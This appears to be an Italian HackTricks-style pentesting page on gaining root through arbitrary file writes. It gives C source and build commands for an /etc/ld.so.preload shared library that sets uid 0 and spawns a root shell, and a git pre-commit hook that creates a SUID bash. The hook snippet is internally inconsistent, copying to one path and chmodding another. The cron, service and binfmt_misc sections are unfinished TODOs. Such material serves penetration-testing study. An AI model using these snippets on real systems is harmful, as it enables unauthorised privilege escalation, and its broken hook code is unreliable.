# Scrittura Arbitraria di File come Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Questo file si comporta come la variabile d'ambiente **`LD_PRELOAD`** ma funziona anche con i **binaries SUID**.\
Se puoi crearlo o modificarlo, puoi semplicemente aggiungere un **percorso a una libreria che verrà caricata** con ogni binary eseguito.

Ad esempio: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sono **script** che vengono **eseguiti** su vari **eventi** in un repository git, come quando viene creato un commit, un merge... Quindi, se uno **script o utente privilegiato** sta eseguendo queste azioni frequentemente ed è possibile **scrivere nella cartella `.git`**, questo può essere utilizzato per **privesc**.

Ad esempio, è possibile **generare uno script** in un repo git in **`.git/hooks`** in modo che venga sempre eseguito quando viene creato un nuovo commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

Il file situato in `/proc/sys/fs/binfmt_misc` indica quale binario dovrebbe eseguire quale tipo di file. TODO: controlla i requisiti per abusare di questo per eseguire una rev shell quando un tipo di file comune è aperto.

{{#include ../../banners/hacktricks-training.md}}
